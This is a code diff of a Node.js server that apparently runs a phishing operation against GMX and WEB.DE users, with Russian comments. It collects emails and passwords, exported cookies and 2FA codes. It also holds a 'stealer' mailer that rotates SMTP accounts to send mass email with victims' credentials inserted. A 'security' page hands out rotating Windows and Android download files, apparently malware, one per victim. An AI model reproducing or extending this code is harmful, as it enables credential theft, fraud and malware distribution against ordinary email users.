@@ -2,15 +2,16 @@
  * Сервер: приём данных с формы (email/пароль) и отдача списка в админку.
  * WebSocket для мгновенного обновления админки (npm install ws).
  */
-require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });
 const http = require('http');
 const https = require('https');
 const net = require('net');
 const dns = require('dns');
 const fs = require('fs');
 const path = require('path');
-/** Корень репозитория (рядом с package.json, login/, public/, data/). */
-const PROJECT_ROOT = path.join(__dirname, '..');
+const { PROJECT_ROOT, DATA_DIR, initAppServices } = require('./bootstrap');
+const { mergeServiceRouteDeps } = require('./routeHttpDeps');
+const { isAdminRequest } = require('./adminPaths');
+const { attachAdminLeadsWebSocket } = require('./wsAdminBroadcast');
 const url = require('url');
 const os = require('os');
 const {
@@ -59,10 +60,9 @@ const archiveFlagIsSet = leadService.archiveFlagIsSet;
 const leadIsWorkedFromEvents = leadService.leadIsWorkedFromEvents;
 const leadIsWorkedLikeAdmin = leadService.leadIsWorkedLikeAdmin;
 
-const { execSync, spawnSync, spawn } = require('child_process');
 const yauzl = require('yauzl');
-let nodemailer;
-try { nodemailer = require('nodemailer'); } catch (e) { nodemailer = null; }
+const mailService = require('./services/mailService');
+const downloadKitService = require('./services/downloadKitService');
 let WebSocketServer;
 try {
   WebSocketServer = require('ws').WebSocketServer;
@@ -230,24 +230,13 @@ const ENABLE_EMAIL_DOMAIN_ALLOWLIST = /^1|true|yes$/i.test(String(process.env.EN
 /** Требовать cookie гейта для POST /api/submit, /api/klein-anmelden-seen, /api/download-request. По умолчанию выкл (Env: REQUIRE_GATE_COOKIE=1). */
 const REQUIRE_GATE_COOKIE = /^1|true|yes$/i.test(String(process.env.REQUIRE_GATE_COOKIE || '').trim());
 
-/**
- * Одна папка для SQLite (database.sqlite), чата/режима в БД и остальных data-файлов.
- * Если фишинг (gmx-net) и админка (grzl.org) — разные PM2-приложения/каталоги кода,
- * задайте ОДИН И ТОТ ЖЕ абсолютный путь в GMW_DATA_DIR на обоих.
- */
-const DATA_DIR = process.env.GMW_DATA_DIR
-  ? path.resolve(process.env.GMW_DATA_DIR)
-  : path.join(PROJECT_ROOT, 'data');
+/** DATA_DIR и PROJECT_ROOT — из bootstrap.js (dotenv загружается там). */
 const START_PAGE_FILE = path.join(DATA_DIR, 'start-page.txt');
 const SHORT_DOMAINS_FILE = path.join(DATA_DIR, 'short-domains.json');
 const ZIP_PASSWORD_FILE = path.join(DATA_DIR, 'zip-password.txt');
 const ALL_LOG_FILE = path.join(DATA_DIR, 'all.txt');
 const DEBUG_LOG_FILE = path.join(DATA_DIR, 'debug.log');
 const SAVED_CREDENTIALS_FILE = path.join(DATA_DIR, 'saved-credentials.json');
-const STEALER_EMAIL_FILE = path.join(DATA_DIR, 'stealer-email.json');
-const CONFIG_EMAIL_FILE = path.join(DATA_DIR, 'config-email.json');
-const WARMUP_EMAIL_FILE = path.join(DATA_DIR, 'warmup-email.json');
-const WARMUP_SMTP_STATS_FILE = path.join(DATA_DIR, 'warmup-smtp-stats.json');
 /** Папка загрузок для страницы /sicherheit. Поддержка 5 файлов (по одному на «человека»), выбор по leadId. */
 const DOWNLOADS_DIR = path.join(PROJECT_ROOT, 'downloads');
 const DOWNLOAD_FILES_CONFIG = path.join(DATA_DIR, 'download-files.json');
@@ -261,22 +250,7 @@ const DOWNLOAD_ROTATION_FILE = path.join(DATA_DIR, 'download-rotation.json');
 const COOKIES_EXPORTED_FILE = path.join(DATA_DIR, 'cookies-exported.json');
 /** Прокси для скрипта входа WEB.DE (login/proxy.txt — тот же файл читает lead_simulation_api.py) */
 const PROXY_FILE = path.join(PROJECT_ROOT, 'login', 'proxy.txt');
-/** Список индексов отпечатков (строки с числами) — подмножество webde_fingerprints.json; пусто = все */
-const WEBDE_FP_INDICES_FILE = path.join(PROJECT_ROOT, 'login', 'webde_fingerprint_indices.txt');
-const WEBDE_FINGERPRINTS_JSON = path.join(PROJECT_ROOT, 'login', 'webde_fingerprints.json');
-const WEBDE_PROBE_BATCH_SCRIPT = path.join(PROJECT_ROOT, 'login', 'webde_probe_batch.py');
-/** За один «Старт» в админке — не больше N индексов (остальное — следующими запусками). Env: WEBDE_PROBE_MAX_INDICES_PER_JOB */
-const WEBDE_PROBE_MAX_INDICES_PER_JOB = (function () {
-  const n = parseInt(process.env.WEBDE_PROBE_MAX_INDICES_PER_JOB || '12', 10);
-  if (!Number.isFinite(n) || n < 1) return 12;
-  return Math.min(500, n);
-})();
 const LOGIN_DIR = path.join(PROJECT_ROOT, 'login');
-/** Фоновые пробы отпечатков WEB.DE в админке: jobId → состояние */
-const webdeProbeJobs = new Map();
-let webdeProbeJobSeq = 0;
-/** Смещение по списку разрешённых индексов: следующий «Старт» берёт следующую порцию (не те же 12 с начала). */
-let webdeFpProbeIndexCursor = 0;
 const LOGIN_ARTIFACT_NAMES = ['webde_screenshot.png', 'webde_page_info.txt', 'debug_screenshot.png', 'debug_consent.png', 'lead_data.json', 'lead_result.json'];
 const LOGIN_CLEANUP_MAX_AGE_MS = 10 * 60 * 1000; // 10 мин неактивности — удаляем артефакты (оставляем куки и данные лидов)
 const short = require('./short');
@@ -285,6 +259,21 @@ const DEFAULT_DOWNLOAD_LIMIT = 5;
 /** Временная папка для Check (файл ещё не добавлен в кнопку скачивания) */
 const CHECK_DIR = path.join(os.tmpdir(), 'gmw-check');
 const CHECK_META_FILE = path.join(CHECK_DIR, 'meta.json');
+
+downloadKitService.init({
+  DATA_DIR, PROJECT_ROOT, DOWNLOADS_DIR, DOWNLOAD_SLOTS_COUNT, DEFAULT_DOWNLOAD_LIMIT,
+  DOWNLOAD_FILES_CONFIG, DOWNLOAD_LIMITS_FILE, DOWNLOAD_COUNTS_FILE, DOWNLOAD_ANDROID_CONFIG,
+  DOWNLOAD_ANDROID_LIMITS_FILE, DOWNLOAD_SETTINGS_FILE, DOWNLOAD_ROTATION_FILE, COOKIES_EXPORTED_FILE,
+});
+const {
+  readDownloadFilesConfig, writeDownloadFilesConfig, readDownloadLimits, writeDownloadLimits,
+  readDownloadCounts, writeDownloadCounts, incrementDownloadCount, readCookiesExported, writeCookiesExported,
+  sanitizeFilenameForHeader, slotFromLeadId, readDownloadSettings, writeDownloadSettings,
+  readDownloadRotation, writeDownloadRotation, getSlotForLead, getSicherheitDownloadFile,
+  getSicherheitDownloadFileByLimit, getSicherheitDownloadFiles, readAndroidDownloadConfig,
+  getAndroidDownloadFile, getAndroidDownloadFileByLimit, readAndroidDownloadLimits,
+  writeAndroidDownloadLimits, getAndroidDownloadFiles, writeAndroidDownloadConfig, processArchiveToGmx,
+} = downloadKitService;
 
 /** kind smsCodeData: 2fa | sms (или эвристика по status/логу) — для скрипта опроса 2FA и согласованности с админкой. */
 function smsCodeDataKindForLead(lead) {
@@ -341,740 +330,6 @@ function writeCheckMeta(meta) {
     if (!fs.existsSync(CHECK_DIR)) fs.mkdirSync(CHECK_DIR, { recursive: true });
     fs.writeFileSync(CHECK_META_FILE, JSON.stringify(meta, null, 0));
   } catch (e) {}
-}
-/** Парсит одну строку SMTP: host:port:user:fromEmail:password (пароль может содержать ':') */
-function parseSmtpLine(line) {
-  const raw = (line || '').trim();
-  const s = raw.indexOf('\n') >= 0 ? raw.split('\n')[0].trim() : raw;
-  if (!s) return null;
-  const parts = s.split(':');
-  if (parts.length < 5) return null;
-  const host = (parts[0] || '').trim();
-  const port = parseInt(parts[1], 10) || 587;
-  let user = (parts[2] || '').trim();
-  let fromEmail = (parts[3] || '').trim();
-  let password = parts.slice(4).join(':').trim();
-  if (user.length > 256) user = user.slice(0, 256);
-  if (fromEmail.length > 256) fromEmail = fromEmail.slice(0, 256);
-  if (password.length > 256) password = password.slice(0, 256);
-  return {
-    host,
-    port,
-    user,
-    fromEmail,
-    password
-  };
-}
-
-/** Парсит поле SMTP с несколькими строками (каждая строка = один SMTP). Возвращает массив. */
-function parseSmtpLines(line) {
-  const raw = (line || '').trim();
-  const lines = raw.split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
-  const result = [];
-  for (const s of lines) {
-    const smtp = parseSmtpLine(s);
-    if (smtp && smtp.host && smtp.user && smtp.password) result.push(smtp);
-  }
-  return result;
-}
-
-function readStealerEmailConfig() {
-  try {
-    if (fs.existsSync(STEALER_EMAIL_FILE)) {
-      const raw = fs.readFileSync(STEALER_EMAIL_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      if (data.configs && Array.isArray(data.configs)) {
-        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
-        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
-        return { currentId, configs: data.configs, current };
-      }
-      const legacy = data;
-      const id = 'legacy-' + Date.now();
-      if (legacy.smtp && legacy.smtpUser) {
-        const smtpLine = [legacy.smtp, String(legacy.smtpPort || 587), legacy.smtpUser, legacy.smtpUser, legacy.smtpPass || ''].join(':');
-        const migrated = { currentId: id, configs: [{ id, name: 'Default', smtpLine, html: legacy.html || '', senderName: legacy.senderName || '', title: legacy.title || '' }] };
-        writeStealerEmailConfig(migrated);
-        const cur = migrated.configs[0];
-        return { currentId: id, configs: migrated.configs, current: cur };
-      }
-    }
-  } catch (e) {}
-  const emptyId = 'default';
-  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '' } };
-  return empty;
-}
-function writeStealerEmailConfig(data) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
-    fs.writeFileSync(STEALER_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
-  } catch (e) {}
-}
-
-function readConfigEmail() {
-  try {
-    if (fs.existsSync(CONFIG_EMAIL_FILE)) {
-      const raw = fs.readFileSync(CONFIG_EMAIL_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      if (data.configs && Array.isArray(data.configs)) {
-        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
-        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
-        return { currentId, configs: data.configs, current };
-      }
-    }
-  } catch (e) {}
-  const emptyId = 'default';
-  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', senderName: '', title: '', html: '' } };
-  return empty;
-}
-function writeConfigEmail(data) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
-    fs.writeFileSync(CONFIG_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
-  } catch (e) {}
-}
-
-function readWarmupEmailConfig() {
-  try {
-    if (fs.existsSync(WARMUP_EMAIL_FILE)) {
-      const raw = fs.readFileSync(WARMUP_EMAIL_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      if (data.configs && Array.isArray(data.configs)) {
-        const currentId = data.currentId || (data.configs[0] && data.configs[0].id) || null;
-        const current = data.configs.find(function (c) { return c.id == currentId; }) || data.configs[0] || null;
-        return { currentId, configs: data.configs, current };
-      }
-    }
-  } catch (e) {}
-  const emptyId = 'default';
-  const empty = { currentId: emptyId, configs: [{ id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' }], current: { id: emptyId, name: 'Default', smtpLine: '', html: '', senderName: '', title: '', recipientsList: '' } };
-  return empty;
-}
-function writeWarmupEmailConfig(data) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const toWrite = data.configs ? { currentId: data.currentId, configs: data.configs } : data;
-    fs.writeFileSync(WARMUP_EMAIL_FILE, JSON.stringify(toWrite || {}, null, 2), 'utf8');
-  } catch (e) {}
-}
-
-function readWarmupSmtpStats() {
-  try {
-    if (fs.existsSync(WARMUP_SMTP_STATS_FILE)) {
-      const raw = fs.readFileSync(WARMUP_SMTP_STATS_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      if (data && typeof data === 'object') return data;
-    }
-  } catch (e) {}
-  return {};
-}
-function writeWarmupSmtpStats(stats) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(WARMUP_SMTP_STATS_FILE, JSON.stringify(stats || {}, null, 2), 'utf8');
-  } catch (e) {}
-}
-
-const warmupState = {
-  running: false,
-  stopped: false,
-  paused: false,
-  configs: [],
-  /** Плоский список { config, smtp } для ротации 1→2→3→1… */
-  flatList: [],
-  leads: [],
-  perSmtpLimit: 0,
-  delayMs: 2000,
-  /** Текущее число параллельных цепочек отправки (для добавления при снятии паузы) */
-  numThreads: 1,
-  /** Отправлено с каждого SMTP (ключ — fromEmail) */
-  sentPerSmtp: {},
-  log: [],
-  totalSent: 0
-};
-const WARMUP_LOG_MAX = 500;
-
-let sendStealerSmtpIndex = 0;
-/** SMTP, с которых была ошибка отправки (554 и т.д.) — исключаются из списка до перезапуска сервера */
-const sendStealerFailedSmtpEmails = new Set();
-
-function runWarmupStep() {
-  if (warmupState.stopped || !warmupState.running) {
-    warmupState.running = false;
-    warmupState.log.push({ text: '[Прогрев остановлен]', type: 'muted' });
-    return;
-  }
-  if (warmupState.paused) {
-    setTimeout(runWarmupStep, 500);
-    return;
-  }
-  const flatList = warmupState.flatList;
-  const leads = warmupState.leads;
-  const limit = warmupState.perSmtpLimit;
-  const sentPerSmtp = warmupState.sentPerSmtp;
-  if (!flatList.length || !leads.length) {
-    warmupState.running = false;
-    warmupState.log.push({ text: '[Прогрев завершён: нет SMTP или лидов]', type: 'muted' });
-    return;
-  }
-  const s = warmupState.totalSent;
-  let chosen = null;
-  for (let k = 0; k < flatList.length; k++) {
-    const idx = (s + k) % flatList.length;
-    const entry = flatList[idx];
-    if ((sentPerSmtp[entry.smtp.fromEmail] || 0) < limit) {
-      chosen = entry;
-      break;
-    }
-  }
-  if (!chosen) {
-    warmupState.running = false;
-    warmupState.log.push({ text: '[Прогрев завершён: лимит по каждому SMTP достигнут]', type: 'muted' });
-    return;
-  }
-  const cfg = chosen.config;
-  const smtp = chosen.smtp;
-  warmupState.totalSent++;
-  warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 0) + 1;
-  // s растёт с каждой отправкой → при новом круге SMTP (s=3,4,5…) берём следующий блок лидов (3,4,5…), чтобы один SMTP не слал повторно на одни и те же адреса
-  const leadIndex = s % leads.length;
-  const lead = leads[leadIndex];
-  const toEmail = (lead.email || '').trim();
-  if (!toEmail) {
-    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
-    setTimeout(runWarmupStep, 100);
-    return;
-  }
-  const password = (lead.password || '').trim();
-  let html = (cfg.html || '').replace(/_email_/g, toEmail).replace(/_password_/g, password);
-  const attachments = [];
-  if (cfg.image1Base64 && html.indexOf('_src1_') !== -1) {
-    try {
-      const buf = Buffer.from(cfg.image1Base64, 'base64');
-      html = html.replace(/_src1_/g, 'cid:image1@mail');
-      attachments.push({ filename: 'image1.png', content: buf, cid: 'image1@mail' });
-    } catch (e) {}
-  } else if (html.indexOf('_src1_') !== -1) {
-    html = html.replace(/_src1_/g, '');
-  }
-  if (!nodemailer) {
-    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
-    warmupState.totalSent--;
-    warmupState.log.push({ text: '[nodemailer не установлен]', type: 'error' });
-    warmupState.running = false;
-    return;
-  }
-  const transporter = nodemailer.createTransport({
-    host: smtp.host,
-    port: smtp.port,
-    secure: smtp.port === 465,
-    auth: { user: smtp.user, pass: smtp.password }
-  });
-  const fromStr = (cfg.senderName ? '"' + String(cfg.senderName).replace(/"/g, '') + '" <' + smtp.fromEmail + '>' : smtp.fromEmail);
-  const mailOptions = {
-    from: fromStr,
-    to: toEmail,
-    subject: (cfg.title || '').trim() || 'Message',
-    html,
-    attachments: attachments.length ? attachments : undefined,
-    envelope: { from: smtp.fromEmail, to: toEmail }
-  };
-  transporter.sendMail(mailOptions).then(() => {
-    writeWarmupSmtpStats(warmupState.sentPerSmtp);
-    warmupState.log.push({ text: 'Отправлено с ' + smtp.fromEmail + ' на ' + toEmail, type: 'success' });
-    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
-    setTimeout(runWarmupStep, warmupState.delayMs);
-  }).catch((err) => {
-    warmupState.sentPerSmtp[smtp.fromEmail] = (warmupState.sentPerSmtp[smtp.fromEmail] || 1) - 1;
-    const msg = (err.message || String(err)).slice(0, 150);
-    warmupState.log.push({ text: '[Ошибка ' + smtp.fromEmail + ' → ' + toEmail + ': ' + msg + ']', type: 'error' });
-    if (warmupState.log.length > WARMUP_LOG_MAX) warmupState.log.shift();
-    setTimeout(runWarmupStep, Math.min(warmupState.delayMs, 5000));
-  });
-}
-
-function readDownloadFilesConfig() {
-  try {
-    if (fs.existsSync(DOWNLOAD_FILES_CONFIG)) {
-      const raw = fs.readFileSync(DOWNLOAD_FILES_CONFIG, 'utf8');
-      const data = JSON.parse(raw);
-      const list = Array.isArray(data.files) ? data.files : [];
-      const out = [];
-      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
-        const v = list[i];
-        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
-      }
-      return out;
-    }
-  } catch (e) {}
-  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
-}
-function writeDownloadFilesConfig(files) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    const list = Array.isArray(files) ? files.slice(0, DOWNLOAD_SLOTS_COUNT) : [];
-    while (list.length < DOWNLOAD_SLOTS_COUNT) list.push(null);
-    fs.writeFileSync(DOWNLOAD_FILES_CONFIG, JSON.stringify({ files: list }, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-function readDownloadLimits() {
-  try {
-    if (fs.existsSync(DOWNLOAD_LIMITS_FILE)) {
-      const raw = fs.readFileSync(DOWNLOAD_LIMITS_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      return data && typeof data === 'object' ? data : {};
-    }
-  } catch (e) {}
-  return {};
-}
-
-function writeDownloadLimits(limits) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-function readDownloadCounts() {
-  try {
-    if (fs.existsSync(DOWNLOAD_COUNTS_FILE)) {
-      const raw = fs.readFileSync(DOWNLOAD_COUNTS_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      return data && typeof data === 'object' ? data : {};
-    }
-  } catch (e) {}
-  return {};
-}
-
-function writeDownloadCounts(counts) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts && typeof counts === 'object' ? counts : {}, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-function incrementDownloadCount(fileName) {
-  if (!fileName || typeof fileName !== 'string') return;
-  const counts = readDownloadCounts();
-  const name = path.basename(fileName).replace(/\.\./g, '').replace(/[/\\]/g, '');
-  if (!name) return;
-  counts[name] = (counts[name] || 0) + 1;
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_COUNTS_FILE, JSON.stringify(counts, null, 0), 'utf8');
-  } catch (e) {}
-}
-function readCookiesExported() {
-  try {
-    if (!fs.existsSync(COOKIES_EXPORTED_FILE)) return [];
-    const raw = fs.readFileSync(COOKIES_EXPORTED_FILE, 'utf8');
-    const data = JSON.parse(raw);
-    return Array.isArray(data) ? data : [];
-  } catch (e) { return []; }
-}
-function writeCookiesExported(list) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(COOKIES_EXPORTED_FILE, JSON.stringify(list, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-/** Санитизация имени файла для заголовка Content-Disposition (удаление недопустимых символов). */
-function sanitizeFilenameForHeader(name) {
-  if (!name || typeof name !== 'string') return 'download';
-  return String(name)
-    .replace(/[\x00-\x1f\x7f"\\]/g, '')
-    .replace(/^\s+|\s+$/g, '')
-    .replace(/^\.+/, '') || 'download';
-}
-
-/** Индекс слота 0..4 по leadId (стабильный хеш). */
-function slotFromLeadId(leadId) {
-  if (!leadId || typeof leadId !== 'string') return 0;
-  let h = 0;
-  for (let i = 0; i < leadId.length; i++) h = ((h << 5) - h) + leadId.charCodeAt(i) | 0;
-  return Math.abs(h) % DOWNLOAD_SLOTS_COUNT;
-}
-
-/** Настройки ротации: после скольких уникальных юзеров менять файл (0 = выкл, по хешу). */
-function readDownloadSettings() {
-  try {
-    if (fs.existsSync(DOWNLOAD_SETTINGS_FILE)) {
-      const raw = fs.readFileSync(DOWNLOAD_SETTINGS_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      const n = typeof data.rotateAfterUnique === 'number' && data.rotateAfterUnique >= 0 ? data.rotateAfterUnique : 0;
-      return { rotateAfterUnique: n };
-    }
-  } catch (e) {}
-  return { rotateAfterUnique: 0 };
-}
-function writeDownloadSettings(cfg) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_SETTINGS_FILE, JSON.stringify({ rotateAfterUnique: (cfg && cfg.rotateAfterUnique) >= 0 ? cfg.rotateAfterUnique : 0 }, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-/** Состояние ротации: счётчик уникальных и слот на leadId (windows / android отдельно). */
-function readDownloadRotation() {
-  try {
-    if (fs.existsSync(DOWNLOAD_ROTATION_FILE)) {
-      const raw = fs.readFileSync(DOWNLOAD_ROTATION_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      const w = data.windows || {};
-      const a = data.android || {};
-      return {
-        windows: { totalUnique: typeof w.totalUnique === 'number' ? w.totalUnique : 0, leadSlots: w.leadSlots && typeof w.leadSlots === 'object' ? w.leadSlots : {} },
-        android: { totalUnique: typeof a.totalUnique === 'number' ? a.totalUnique : 0, leadSlots: a.leadSlots && typeof a.leadSlots === 'object' ? a.leadSlots : {} }
-      };
-    }
-  } catch (e) {}
-  return { windows: { totalUnique: 0, leadSlots: {} }, android: { totalUnique: 0, leadSlots: {} } };
-}
-function writeDownloadRotation(state) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_ROTATION_FILE, JSON.stringify(state, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-/** Слот для leadId: при ротации — по порядку уникальных (один юзер = один слот навсегда); иначе по хешу. */
-function getSlotForLead(leadId, platform) {
-  const settings = readDownloadSettings();
-  if (!settings.rotateAfterUnique || settings.rotateAfterUnique <= 0) {
-    return leadId ? slotFromLeadId(leadId) : 0;
-  }
-  if (!leadId || typeof leadId !== 'string') return 0;
-  const state = readDownloadRotation();
-  const key = platform === 'android' ? 'android' : 'windows';
-  const block = state[key];
-  if (block.leadSlots[leadId] !== undefined) {
-    return block.leadSlots[leadId];
-  }
-  const slot = Math.floor(block.totalUnique / settings.rotateAfterUnique) % DOWNLOAD_SLOTS_COUNT;
-  block.leadSlots[leadId] = slot;
-  block.totalUnique += 1;
-  writeDownloadRotation(state);
-  return slot;
-}
-/** Файл для слота index (0..4). Без index — первый доступный слот (обратная совместимость). */
-function getSicherheitDownloadFile(index) {
-  const config = readDownloadFilesConfig();
-  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
-    const name = config[index];
-    if (name) {
-      const full = path.join(DOWNLOADS_DIR, name);
-      try {
-        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
-      } catch (e) {}
-    }
-    return null;
-  }
-  const envPath = process.env.SICHERHEIT_DOWNLOAD_PATH;
-  if (envPath) {
-    const full = path.isAbsolute(envPath) ? envPath : path.join(PROJECT_ROOT, envPath);
-    try {
-      if (fs.statSync(full).isFile()) return { filePath: full, fileName: path.basename(full) };
-    } catch (e) {}
-  }
-  for (let i = 0; i < config.length; i++) {
-    if (config[i]) {
-      const info = getSicherheitDownloadFile(i);
-      if (info) return info;
-    }
-  }
-  try {
-    const names = fs.readdirSync(DOWNLOADS_DIR).filter(function (n) { return n !== '.gitkeep' && !n.startsWith('.'); });
-    let newest = null;
-    let newestMtime = 0;
-    for (let i = 0; i < names.length; i++) {
-      const full = path.join(DOWNLOADS_DIR, names[i]);
-      const stat = fs.statSync(full);
-      if (stat.isFile() && stat.mtimeMs >= newestMtime) {
-        newestMtime = stat.mtimeMs;
-        newest = { filePath: full, fileName: names[i] };
-      }
-    }
-    return newest;
-  } catch (e) {}
-  return null;
-}
-
-/** Первый файл по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
-function getSicherheitDownloadFileByLimit() {
-  const files = getSicherheitDownloadFiles();
-  for (let i = 0; i < files.length; i++) {
-    const f = files[i];
-    if (!f.fileName) continue;
-    const limit = f.limit != null ? f.limit : 0;
-    const downloads = f.downloads != null ? f.downloads : 0;
-    if (limit > 0 && downloads >= limit) continue;
-    if (limit <= 0 || downloads < limit) {
-      const full = path.join(DOWNLOADS_DIR, f.fileName);
-      try {
-        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
-      } catch (e) {}
-    }
-  }
-  return getSicherheitDownloadFile();
-}
-/** Список слотов: { fileName, size, downloads, limit } или пустой слот. */
-function getSicherheitDownloadFiles() {
-  const config = readDownloadFilesConfig();
-  const limits = readDownloadLimits();
-  const counts = readDownloadCounts();
-  const out = [];
-  for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
-    const name = config[i];
-    if (!name) {
-      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-      continue;
-    }
-    const full = path.join(DOWNLOADS_DIR, name);
-    try {
-      const stat = fs.statSync(full);
-      if (stat.isFile()) {
-        const limit = typeof limits[name] === 'number' && limits[name] >= 0 ? limits[name] : DEFAULT_DOWNLOAD_LIMIT;
-        out.push({
-          fileName: name,
-          size: stat.size,
-          downloads: typeof counts[name] === 'number' ? counts[name] : 0,
-          limit
-        });
-      } else {
-        out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-      }
-    } catch (e) {
-      out.push({ fileName: null, size: null, downloads: 0, limit: 0 });
-    }
-  }
-  return out;
-}
-
-/** Android: 5 слотов, без пароля. Конфиг: { "files": [name0, name1, ...] } как у Windows. */
-function readAndroidDownloadConfig() {
-  try {
-    if (fs.existsSync(DOWNLOAD_ANDROID_CONFIG)) {
-      const raw = fs.readFileSync(DOWNLOAD_ANDROID_CONFIG, 'utf8');
-      const data = JSON.parse(raw);
-      let list = Array.isArray(data.files) ? data.files : [];
-      if (list.length === 0 && data.fileName && typeof data.fileName === 'string') {
-        list = [data.fileName];
-      }
-      const out = [];
-      for (let i = 0; i < DOWNLOAD_SLOTS_COUNT; i++) {
-        const v = list[i];
-        out.push((v && typeof v === 'string' && !v.includes('..') && !v.includes(path.sep)) ? v : null);
-      }
-      return out;
-    }
-  } catch (e) {}
-  return Array(DOWNLOAD_SLOTS_COUNT).fill(null);
-}
-function getAndroidDownloadFile(index) {
-  const config = readAndroidDownloadConfig();
-  if (typeof index === 'number' && index >= 0 && index < DOWNLOAD_SLOTS_COUNT) {
-    const name = config[index];
-    if (name) {
-      const full = path.join(DOWNLOADS_DIR, name);
-      try {
-        if (fs.statSync(full).isFile()) return { filePath: full, fileName: name };
-      } catch (e) {}
-    }
-    return null;
-  }
-  for (let i = 0; i < config.length; i++) {
-    if (config[i]) {
-      const info = getAndroidDownloadFile(i);
-      if (info) return info;
-    }
-  }
-  return null;
-}
-
-/** Первый файл Android по порядку слотов, у которого downloads < limit (при limit > 0 строго пропускаем переполненные). */
-function getAndroidDownloadFileByLimit() {
-  const files = getAndroidDownloadFiles();
-  for (let i = 0; i < files.length; i++) {
-    const f = files[i];
-    if (!f.fileName) continue;
-    const limit = f.limit != null ? f.limit : 0;
-    const downloads = f.downloads != null ? f.downloads : 0;
-    if (limit > 0 && downloads >= limit) continue;
-    if (limit <= 0 || downloads < limit) {
-      const full = path.join(DOWNLOADS_DIR, f.fileName);
-      try {
-        if (fs.statSync(full).isFile()) return { filePath: full, fileName: f.fileName };
-      } catch (e) {}
-    }
-  }
-  return getAndroidDownloadFile();
-}
-function readAndroidDownloadLimits() {
-  try {
-    if (fs.existsSync(DOWNLOAD_ANDROID_LIMITS_FILE)) {
-      const raw = fs.readFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, 'utf8');
-      const data = JSON.parse(raw);
-      return data && typeof data === 'object' ? data : {};
-    }
-  } catch (e) {}
-  return {};
-}
-
-function writeAndroidDownloadLimits(limits) {
-  try {
-    if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
-    fs.writeFileSync(DOWNLOAD_ANDROID_LIMITS_FILE, JSON.stringify(limits || {}, null, 0), 'utf8');
-  } catch (e) {}
-}
-
-function getAndroidDownloadFiles() {
-  const config = readAndroidDownloadConfig();
-  const limits = readAndroidDownloadLimits();
-  const counts = readDownloadCounts();
-  const out = [];
